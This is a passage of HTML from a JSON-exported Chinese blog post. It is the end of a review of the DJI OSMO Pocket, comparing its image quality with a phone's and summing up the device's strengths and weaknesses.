1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]